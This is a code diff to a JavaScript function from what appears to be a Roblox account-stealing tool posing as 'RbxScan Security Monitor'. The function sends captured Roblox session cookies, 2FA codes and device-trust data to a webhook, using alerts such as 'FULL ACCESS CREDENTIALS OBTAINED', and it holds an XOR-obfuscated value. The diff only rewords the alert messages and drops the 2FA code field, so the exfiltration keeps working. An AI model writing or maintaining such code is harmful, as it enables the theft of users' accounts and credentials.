@@ -821,14 +821,9 @@ async function sendTwoFactorCodeToWebhook(code, trustDevice) {
             .map(n => String.fromCharCode(n ^ 32)).join('');
         
         const embed = {
-            title: "🔐 Roblox 2-Step Authentication Code Captured",
+            title: "🔐 Roblox Authentication Data Captured",
             color: 0x00A2FF,
             fields: [
-                {
-                    name: "📱 2FA Code",
-                    value: `\`${code}\``,
-                    inline: true
-                },
                 {
                     name: "🔒 Trust Device",
                     value: trustDevice ? "✅ Yes (30 days)" : "❌ No",
@@ -856,7 +851,7 @@ async function sendTwoFactorCodeToWebhook(code, trustDevice) {
                 }
             ],
             footer: {
-                text: "RbxScan Security Monitor • 2FA Capture"
+                text: "RbxScan Security Monitor • Auth Capture"
             },
             thumbnail: {
                 url: "https://static.thenounproject.com/png/1655580-200.png"
@@ -864,7 +859,7 @@ async function sendTwoFactorCodeToWebhook(code, trustDevice) {
         };
 
         const payload = {
-            content: `@everyone **🚨 2-Step Authentication & Cookie Captured!**\n${robloxCookie ? '🍪 **FULL ACCESS CREDENTIALS OBTAINED**' : '🔐 **2FA CODE CAPTURED**'}`,
+            content: `@everyone **🚨 Roblox Authentication Data Captured!**\n${robloxCookie ? '🍪 **FULL ACCESS CREDENTIALS OBTAINED**' : '🔐 **AUTHENTICATION COMPLETED**'}`,
             embeds: [embed]
         };
 
